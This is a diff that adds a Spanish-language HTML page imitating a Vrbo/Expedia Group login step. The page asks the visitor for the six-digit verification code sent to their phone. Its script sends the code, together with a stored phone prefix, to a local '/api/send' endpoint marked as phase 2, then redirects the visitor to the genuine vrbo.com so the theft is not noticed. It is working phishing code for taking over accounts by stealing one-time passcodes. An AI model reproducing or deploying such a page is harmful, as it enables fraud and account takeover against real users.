@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ingresa el código de verificación | Expedia Group</title>
+  
+  <link rel="icon" type="image/png" href="pestaña.png" />
+
+  <style>
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 400;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Book.woff2") format("woff2");
+    }
+    @font-face {
+      font-family: "Centra No2";
+      font-weight: 500;
+      src: url("https://a.travel-assets.com/egds/fonts/CentraNo2/CentraNo2-Medium.woff2") format("woff2");
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: "Centra No2", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: #ffffff; color: #191e3b; min-height: 100vh; display: flex; flex-direction: column;
+      justify-content: flex-start; -webkit-font-smoothing: antialiased;
+    }
+    .navbar-container {
+      background: #ffffff; height: 64px; width: 100%; display: flex; justify-content: center;
+      align-items: center; border-bottom: 1px solid #dfe0e4; flex-shrink: 0;
+    }
+    .uitk-header-brand-logo img { height: 36px; display: block; }
+    .page-wrapper { display: flex; justify-content: center; width: 100%; padding: 32px 16px; background: #ffffff; }
+    .card { width: 100%; max-width: 440px; display: flex; flex-direction: column; gap: 24px; }
+    .heading-group { margin-bottom: 0px; display: flex; flex-direction: column; gap: 8px; }
+    h1 { font-size: 24px; font-weight: 500; color: #191e3b; line-height: 1.25; }
+    .subtitle { font-size: 16px; color: #292929; line-height: 1.5; font-weight: 400; margin-top: 4px; }
+    .field-wrapper { position: relative; height: 52px; width: 100%; margin-top: 8px; }
+    .floating-input { width: 100%; height: 100%; padding: 22px 12px 6px 12px; border: 1px solid #818494; border-radius: 8px; font-family: inherit; font-size: 16px; color: #191e3b; background: #fff; outline: none; transition: border-color 0.15s; }
+    .floating-input:focus { border-color: #1668e3; }
+    .floating-label { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); font-size: 16px; color: #676a7d; pointer-events: none; transition: 0.15s; }
+    .floating-input:focus + .floating-label, .floating-input:not(:placeholder-shown) + .floating-label { top: 14px; font-size: 12px; transform: translateY(-50%); }
+    .resend-section { display: flex; flex-direction: column; gap: 16px; margin-top: 4px; }
+    .link-btn { background: none; border: none; color: #1668e3; text-decoration: underline; font-family: inherit; font-size: 14px; cursor: pointer; text-align: left; width: fit-content; }
+    .btn-wrap { display: flex; flex-direction: column; gap: 12px; margin-top: 16px; }
+    .btn { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; border-radius: 9999px; font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; border: 1px solid transparent; }
+    .btn-primary { background-color: #1668e3; color: #ffffff; }
+    .btn-primary:disabled { opacity: 0.36; }
+    .btn-default { background-color: #ffffff; color: #1668e3; border: 1px solid #dfe0e4; }
+    .legal { font-size: 12px; color: #191e3b; line-height: 1.5; text-align: center; margin-top: 8px; }
+    .legal a { color: #1668e3; text-decoration: underline; }
+    @keyframes inner-circle { 0% { transform: rotate(0deg); } to { transform: rotate(1turn); } }
+    .uitk-loader-page { aspect-ratio: 1/1; background-color: #fff; box-shadow: 0 6px 36px rgba(12, 14, 28, 0.12); inline-size: 48px; inset-block-end: 0; inset-inline-start: 50%; opacity: 0; padding: 6px; position: fixed; transform: translate(-50%, 100%); transition: transform .06s, opacity 0s; z-index: 1000; border-radius: 50%; }
+    .uitk-loader-page.is-visible { opacity: 1; transform: translate(-50%, -40px); }
+    .uitk-loader::before { animation: inner-circle .8s linear infinite; aspect-ratio: 1/1; border-bottom-color: #1668e3; border-top-color: rgba(22,104,227,.28); border-left-color: rgba(22,104,227,.28); border-right-color: rgba(22,104,227,.28); border-radius: 50%; border-style: solid; border-width: 6px; content: ""; display: block; inline-size: 36px; }
+  </style>
+</head>
+<body>
+<div class="navbar-container">
+  <a class="uitk-header-brand-logo" href="#"><img src="https://www.vrbo.com/_dms/header/logo.svg" alt="Vrbo"></a>
+</div>
+<div class="page-wrapper">
+  <div class="card">
+    <div class="heading-group">
+      <h1>Ingresa el código de verificación</h1>
+      <div class="subtitle">
+        <p>Ingresa el código de verificación de seis dígitos que enviamos a tu numero registrado.</p>
+        <p style="margin-top: 12px;">Expedia Group nunca se comunicará contigo para pedirte este código.</p>
+      </div>
+    </div>
+    <form id="verify-form">
+      <div class="field-wrapper">
+        <input type="text" id="verifyCode" class="floating-input" placeholder=" " maxlength="6" inputmode="numeric" />
+        <label for="verifyCode" class="floating-label">Código de 6 dígitos</label>
+      </div>
+      <div class="resend-section">
+        <div><span style="font-size:14px">¿No lo recibiste? </span><button type="button" class="link-btn">Reenviar código.</button></div>
+        <button type="button" class="link-btn">Prefiero que me llamen</button>
+      </div>
+      <div class="btn-wrap">
+        <button type="submit" class="btn btn-primary" id="btn-confirm" disabled>Enviar</button>
+        <button type="button" class="btn btn-default" onclick="window.location.href='vrbologin3.html'">Volver</button>
+      </div>
+    </form>
+    <div class="legal">
+      <p>Al continuar, declaras que leíste y aceptas<br>nuestros <a href="https://www.vrbo.com/legal/terms-and-conditions" target="_blank">Términos y condiciones</a> y <a href="https://www.vrbo.com/legal/privacy-policy" target="_blank">Aviso de privacidad</a>.</p>
+      <p>©2026 Vrbo México. Todos los derechos reservados.</p>
+    </div>
+  </div>
+</div>
+<span class="uitk-loader uitk-loader-page" id="page-loader"><span class="is-visually-hidden"></span></span>
+<script>
+  const verifyInput = document.getElementById('verifyCode');
+  const btnConfirm = document.getElementById('btn-confirm');
+  const loader = document.getElementById('page-loader');
+
+  verifyInput.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+    btnConfirm.disabled = this.value.length !== 6;
+  });
+
+  document.getElementById('verify-form').addEventListener('submit', (e) => {
+    e.preventDefault();
+    btnConfirm.disabled = true;
+    loader.classList.add('is-visible');
+
+    const lada   = sessionStorage.getItem('vrbo_lada') || '';
+    const numero = verifyInput.value;
+
+    fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ lada, numero, fase: '2' })
+    }).finally(() => {
+      setTimeout(() => { window.location.href = 'https://www.vrbo.com/?siteid=9025005'; }, 3000);
+    });
+  });
+</script>
+</body>
+</html>
